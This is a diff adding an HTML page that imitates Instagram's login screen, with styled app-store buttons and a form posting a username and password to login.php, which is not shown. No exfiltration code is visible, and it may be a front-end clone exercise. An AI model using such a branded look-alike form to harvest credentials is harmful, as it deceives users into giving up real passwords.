@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+  .store-section {
+  text-align: center;
+  margin-top: 40px;
+  font-family: Arial, sans-serif;
+}
+
+.store-section p {
+  font-size: 16px;
+  color: #8e8e8e;
+  margin-bottom: 10px;
+}
+
+.store-buttons {
+  display: flex;
+  justify-content: center;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+
+.store-buttons a {
+  display: flex;
+  align-items: center;
+  text-decoration: none;
+  background-color: black;
+  color: white;
+  padding: 10px 14px;
+  border-radius: 8px;
+  width: 160px;
+  transition: transform 0.2s;
+}
+
+.store-buttons a:hover {
+  transform: scale(1.05);
+}
+
+.store-buttons .icon {
+  font-size: 28px;
+  margin-right: 10px;
+}
+
+.store-buttons .text {
+  display: flex;
+  flex-direction: column;
+  line-height: 1;
+}
+
+.store-buttons .text small {
+  font-size: 10px;
+  color: #ccc;
+  letter-spacing: 0.5px;
+}
+
+.store-buttons .text strong {
+  font-size: 15px;
+}
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <h1 class="logo">Instagram</h1>
+      <form action="login.php" method="POST">
+        <input type="text" name="username" placeholder="Phone number, username, or email" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit"><a href="instagram-home.html">Log In</a></button>
+        <div class="separator">
+          <div class="line"></div>
+          <span>OR</span>
+          <div class="line"></div>
+        </div>
+        <a href="login-facebook.html" class="fb-login">Log in with Facebook</a>
+        <a href="forgot-pass.html" class="forgot">Forgot password?</a>
+      </form>
+    </div>
+
+    <div class="signup-box">
+      <p>Don't have an account?</p>
+	  <a href="signup.html">Sign up</a>
+    </div>
+	<div class="store-section">
+  <p>Get the app.</p>
+  <div class="store-buttons">
+    <a href="https://play.google.com/store" class="google-play" target="_blank">
+      <span class="icon">▶</span>
+      <div class="text">
+        <small>GET IT ON</small>
+        <strong>Google Play</strong>
+      </div>
+    </a>
+
+    <a href="https://www.apple.com/in/app-store/" class="app-store" target="_blank">
+      <span class="icon"></span>
+      <div class="text">
+        <small>Download on the</small>
+        <strong>App Store</strong>
+      </div>
+    </a>
+  </div>
+</div>
+
+
+
+    </div>
+  </div>
+</body>
+</html>
